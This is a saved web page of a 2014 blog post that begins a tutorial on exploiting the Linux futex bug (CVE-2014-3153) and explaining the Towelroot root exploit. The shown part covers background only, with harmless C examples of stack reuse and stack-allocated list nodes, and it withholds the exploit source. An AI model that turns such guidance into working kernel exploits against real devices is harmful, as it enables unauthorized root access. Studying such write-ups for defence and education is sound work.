<!DOCTYPE html>
<!-- saved from url=(0082)https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/ -->
<html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="https://gmpg.org/xfn/11">
<link rel="pingback" href="https://tinyhack.com/xmlrpc.php">
<script type="text/javascript">(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>Exploiting the Futex Bug and uncovering Towelroot – Tinyhack.com</title>
<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
<link href="https://fonts.gstatic.com/" crossorigin="" rel="preconnect">
<link rel="alternate" type="application/rss+xml" title="Tinyhack.com » Feed" href="https://tinyhack.com/feed/">
<link rel="alternate" type="application/rss+xml" title="Tinyhack.com » Comments Feed" href="https://tinyhack.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Tinyhack.com » Exploiting the Futex Bug and uncovering Towelroot Comments Feed" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/feed/">
<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/tinyhack.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.6.6"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
<style>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/style.css" media="all">
<link rel="stylesheet" id="wp-block-library-theme-css" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/theme.css" media="all">
<link crossorigin="anonymous" rel="stylesheet" id="twentysixteen-fonts-css" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/css" media="all">
<link rel="stylesheet" id="genericons-css" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/genericons.css" media="all">
<link rel="stylesheet" id="twentysixteen-style-css" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/style(1).css" media="all">
<link rel="stylesheet" id="twentysixteen-block-style-css" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/blocks.css" media="all">
<!--[if lt IE 10]>
<link rel='stylesheet' id='twentysixteen-ie-css'  href='https://tinyhack.com/wp-content/themes/twentysixteen/css/ie.css?ver=20170530' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentysixteen-ie8-css'  href='https://tinyhack.com/wp-content/themes/twentysixteen/css/ie8.css?ver=20170530' media='all' />
<![endif]-->
<!--[if lt IE 8]>
<link rel='stylesheet' id='twentysixteen-ie7-css'  href='https://tinyhack.com/wp-content/themes/twentysixteen/css/ie7.css?ver=20170530' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<script src='https://tinyhack.com/wp-content/themes/twentysixteen/js/html5.js?ver=3.7.3' id='twentysixteen-html5-js'></script>
<![endif]-->
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/jquery.min.js.下載" id="jquery-core-js" type="text/javascript"></script>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/jquery-migrate.min.js.下載" id="jquery-migrate-js" type="text/javascript"></script>
<link rel="https://api.w.org/" href="https://tinyhack.com/wp-json/"><link rel="alternate" type="application/json" href="https://tinyhack.com/wp-json/wp/v2/posts/304"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://tinyhack.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://tinyhack.com/wp-includes/wlwmanifest.xml">
<meta name="generator" content="WordPress 5.6.6">
<link rel="canonical" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/">
<link rel="shortlink" href="https://tinyhack.com/?p=304">
<link rel="alternate" type="application/json+oembed" href="https://tinyhack.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ftinyhack.com%2F2014%2F07%2F07%2Fexploiting-the-futex-bug-and-uncovering-towelroot%2F">
<link rel="alternate" type="text/xml+oembed" href="https://tinyhack.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ftinyhack.com%2F2014%2F07%2F07%2Fexploiting-the-futex-bug-and-uncovering-towelroot%2F&amp;format=xml">
<script type="text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//tinyhack.com/?wordfence_lh=1&hid=F948810C79B7CCBD8DEBBBC49EDBB5FE');
</script><style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><link rel="amphtml" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/amp/">


<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Tinyhack.com">
<meta property="og:title" content="Exploiting the Futex Bug and uncovering Towelroot">
<meta property="og:url" content="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/">
<meta property="og:type" content="article">
<meta property="og:description" content="The Futex bug (CVE-2014-3153) is a serious bug that affects most Linux kernel version and was made popular by geohot in his towelroot exploit. You can read the original comex report at hackerone. Others have succesfully implemented this (this one for example), but no public exploit source code is av">
<meta property="article:published_time" content="2014-07-07T02:23:37+00:00">
<meta property="article:modified_time" content="2018-11-21T02:24:01+00:00">
<meta property="og:updated_time" content="2018-11-21T02:24:01+00:00">
<meta property="article:section" content="hacks">
<meta property="article:section" content="linux">
<meta property="article:section" content="security">

<meta itemprop="name" content="Exploiting the Futex Bug and uncovering Towelroot">
<meta itemprop="headline" content="Exploiting the Futex Bug and uncovering Towelroot">
<meta itemprop="description" content="The Futex bug (CVE-2014-3153) is a serious bug that affects most Linux kernel version and was made popular by geohot in his towelroot exploit. You can read the original comex report at hackerone. Others have succesfully implemented this (this one for example), but no public exploit source code is av">
<meta itemprop="datePublished" content="2014-07-07">
<meta itemprop="dateModified" content="2018-11-21T02:24:01+00:00">
<meta itemprop="author" content="admin">
 

<meta name="twitter:title" content="Exploiting the Futex Bug and uncovering Towelroot">
<meta name="twitter:url" content="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/">
<meta name="twitter:description" content="The Futex bug (CVE-2014-3153) is a serious bug that affects most Linux kernel version and was made popular by geohot in his towelroot exploit. You can read the original comex report at hackerone. Others have succesfully implemented this (this one for example), but no public exploit source code is av">
<meta name="twitter:card" content="summary_large_image">




<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/wp-emoji-release.min.js.下載" type="text/javascript" defer=""></script><script type="text/javascript" async="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/saved_resource"></script></head>
<body class="post-template-default single single-post postid-304 single-format-standard wp-embed-responsive">
<div id="page" class="site">
<div class="site-inner">
<a class="skip-link screen-reader-text" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#content">Skip to content</a>
<header id="masthead" class="site-header" role="banner">
<div class="site-header-main">
<div class="site-branding">
<p class="site-title"><a href="https://tinyhack.com/" rel="home">Tinyhack.com</a></p>
<p class="site-description">Just another WordPress site</p>
</div>
</div>
</header>
<div id="content" class="site-content">
<div id="primary" class="content-area">
<main id="main" class="site-main" role="main">
<article id="post-304" class="post-304 post type-post status-publish format-standard hentry category-hacks category-linux category-security">
<header class="entry-header">
<h1 class="entry-title">Exploiting the Futex Bug and uncovering Towelroot</h1> </header>
<div class="entry-content">
<p>The Futex bug (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3153">CVE-2014-3153</a>) is a serious bug that affects most Linux kernel version and was made popular by geohot in his <a href="https://towelroot.com/">towelroot</a> exploit. You can read the original <a href="https://twitter.com/comex">comex</a> report <a href="https://hackerone.com/reports/13388">at hackerone</a>. Others have succesfully implemented this (<a href="http://www.clevcode.org/cve-2014-3153-linux-kernel-exploit-futex-vulnerability/">this one for example</a>), but no public exploit source code is available.</p>
<p>This post will describe in detail about what exactly is the futex bug, how to exploit the futex bug, and also explains how towelroot works and what the <a href="https://towelroot.com/modstrings.html">modstring in Towelroot v3</a> actually do. Following the footsteps of other security researchers, I will not give a full source code to the exploit. By giving enough details, I hope programmers can learn and appreciate the exploit created for this bug. By not releasing the source, I hope this should stop most script kiddies. There will be some small details that I will gloss over (about the priority list manipulation), so it will require some thinking and experimentation to implement the exploit.</p>
<p>One thing to note: I did some kernel programming, but never written a kernel exploit before, so this is my first time, I hope this is a good write up for a newbie exploit writer like me. Distributing the exploit source code will be useful only to handful of people, but writing about it will be useful to all programmers interested in this.</p>
<p>Towelroot is not opensource, and the binary is protected from reverse engineering by compiling it with <a href="https://github.com/obfuscator-llvm/">llvm-obfuscator</a>. When I started, I tried using 64 bit kernel on my desktop, and was not successful because I can’t find a syscall that can alter the stack in the correct location. So I decided to do a blackbox reverse engineering by looking at syscalls used by towelroot. Since (I think) I know how towelroot works, I will discuss about it, and I hope it will help people to understand/modify modstrings used in towelroot v3.</p>
<p>If you are an exploit hacker, just jump to “on to the kernel” part. The initial part is only for those unexperienced in writing exploits.</p>
<p>Before exploiting this bug we need to understand what the bug is. In short, the bug is that there is a data structure in the stack, that is part of a priority list that is left there and can be manipulated. This is very vague for most of programmers, so lets break it down. You need to understand what a stack is and how it works.</p>
<h3>The Stack</h3>
<p>A stack is a block of memory set aside for local variable, for parameter passing, and for storing return address of a procedure call. Usually when we talk about stack and exploits, we try to alter the return address and redirect it to another address and probably do ROP (<a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return Oriented Programming</a>). This is not the case with this bug, so forget about that. Even though this bug is about futex, this is also not a race condition bug.</p>
<p>Stack memory is reused accross procedure calls (not cleared) . See this simple example:</p>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/f2e92f79f4bdd1c0ed7d8c8279c81657.js.下載" type="text/javascript"></script><link rel="stylesheet" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist93138621" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stack1-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stack1.c">
        <tbody><tr>
          <td id="file-stack1-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-stack1-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-stack1-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-stack1-c-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-stack1-c-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">foo</span>(<span class="pl-k">int</span> initialize, <span class="pl-k">int</span> val)</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-stack1-c-LC4" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-stack1-c-LC5" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> local;</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-stack1-c-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-stack1-c-LC7" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (initialize) {</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-stack1-c-LC8" class="blob-code blob-code-inner js-file-line">		local = val;</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-stack1-c-LC9" class="blob-code blob-code-inner js-file-line">	} <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-stack1-c-LC10" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>local foo is <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, local);</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-stack1-c-LC11" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-stack1-c-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-stack1-c-LC13" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-stack1-c-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-stack1-c-LC15" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">bar</span>(<span class="pl-k">int</span> initialize, <span class="pl-k">int</span> val)</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-stack1-c-LC16" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-stack1-c-LC17" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">int</span> local;</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-stack1-c-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-stack1-c-LC19" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (initialize) {</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-stack1-c-LC20" class="blob-code blob-code-inner js-file-line">		local = val;</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-stack1-c-LC21" class="blob-code blob-code-inner js-file-line">	} <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-stack1-c-LC22" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>local bar is <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, local);</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-stack1-c-LC23" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-stack1-c-LC24" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-stack1-c-LC25" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-stack1-c-LC26" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-stack1-c-LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>()</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-stack1-c-LC28" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-stack1-c-LC29" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">foo</span>(<span class="pl-c1">1</span>, <span class="pl-c1">10</span>); <span class="pl-c"><span class="pl-c">//</span>set to 10</span></td>
        </tr>
        <tr>
          <td id="file-stack1-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-stack1-c-LC30" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">foo</span>(<span class="pl-c1">0</span>, <span class="pl-c1">0</span>); <span class="pl-c"><span class="pl-c">//</span>print it</span></td>
        </tr>
        <tr>
          <td id="file-stack1-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-stack1-c-LC31" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">bar</span>(<span class="pl-c1">1</span>, <span class="pl-c1">12</span>); <span class="pl-c"><span class="pl-c">//</span>set to 12</span></td>
        </tr>
        <tr>
          <td id="file-stack1-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-stack1-c-LC32" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">foo</span>(<span class="pl-c1">0</span>, <span class="pl-c1">0</span>); <span class="pl-c"><span class="pl-c">//</span>print foo again</span></td>
        </tr>
        <tr>
          <td id="file-stack1-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-stack1-c-LC33" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-stack1-c-LC34" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-stack1-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-stack1-c-LC35" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/yohanes/f2e92f79f4bdd1c0ed7d8c8279c81657/raw/a0720c6230896394854b20fd219129de848d7a35/stack1.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/yohanes/f2e92f79f4bdd1c0ed7d8c8279c81657#file-stack1-c">
          stack1.c
        </a>
        hosted with <img draggable="false" role="img" class="emoji" alt="❤" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/2764.svg"> by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

<pre class="wp-block-preformatted"></pre>
<p>You can compile then run it:</p>
<p><code>gcc test.c -o mytest</code></p>
<p>Note: just compile normally, don’t use any optimization level (-Ox):</p>
<pre class="wp-block-preformatted">$./mytest
local foo is 10
local foo is 12
</pre>
<p>As you can see, both procedures uses exactly the same stack layout. Both local uses the same stack location. When bar is called, it writes to the same stack location used by “foo” for its local variable. This simple concept will play a role in understanding the bug.</p>
<p>Next topic is about linked list. Usually a pointer based data structure uses heap for storing the elements (We don’t use stack because we want the elements to be “permanent” accross calls), but sometimes we can just use the stack, as long as we know that the element is going to be removed when the function exits, this will save time in allocation/deallocation. Here is an example of a made up problem where we put in an element located in the stack then removing it again before returning.</p>
<script src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/9ecc8c8e8fcf6f504ec59c1795312e47.js.下載" type="text/javascript"></script><link rel="stylesheet" href="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist93138652" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stack2-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stack2.c">
        <tbody><tr>
          <td id="file-stack2-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-stack2-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">/*</span>a made up problem where we need to add a temporary element<span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-stack2-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-stack2-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">function1</span>(<span class="pl-k">struct</span> list *lst, <span class="pl-k">int</span> val)</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-stack2-c-LC3" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-stack2-c-LC4" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">struct</span> node n;</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-stack2-c-LC5" class="blob-code blob-code-inner js-file-line">	n.<span class="pl-smi">value</span> = <span class="pl-c1">99999</span>;</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-stack2-c-LC6" class="blob-code blob-code-inner js-file-line">	n.<span class="pl-smi">next</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-stack2-c-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-stack2-c-LC8" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_add</span>(lst, &amp;n);</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-stack2-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-stack2-c-LC10" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">//</span>we want to always have 99999 at the end of print</span></td>
        </tr>
        <tr>
          <td id="file-stack2-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-stack2-c-LC11" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_print</span>(lst);</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-stack2-c-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-stack2-c-LC13" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">list_remove_last_element</span>(lst);</td>
        </tr>
        <tr>
          <td id="file-stack2-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-stack2-c-LC14" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/yohanes/9ecc8c8e8fcf6f504ec59c1795312e47/raw/1ec3b9e78db374e57ca74e6f74c0836ee934098d/stack2.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/yohanes/9ecc8c8e8fcf6f504ec59c1795312e47#file-stack2-c">
          stack2.c
        </a>
        hosted with <img draggable="false" role="img" class="emoji" alt="❤" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/2764.svg"> by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

<p>In that example, if we don’t remove the element and we return, the app will likely crash when the stack content is altered then the list js manipulated. That is the simplified version of the bug in the userland.</p>
<p>To exploit the bug, we need a good understanding of how futex work, especially the PI (Priority Inheritance Futex). There are very good papers that you can read about this topic. The first one is: <a href="http://www.akkadia.org/drepper/futex.pdf">Futexes Are Tricky</a>, this will give a you an idea about what futex is and how it works. The other one is <a href="https://lwn.net/images/conf/rtlws11/papers/proc/p10.pdf">Requeue-PI: Making Glibc Condvars PI-Aware</a>, this will give you a very thorough details about the PI futex implementation in the kernel. I suggest someone trying to implement the exploit to read at least the second paper.</p>
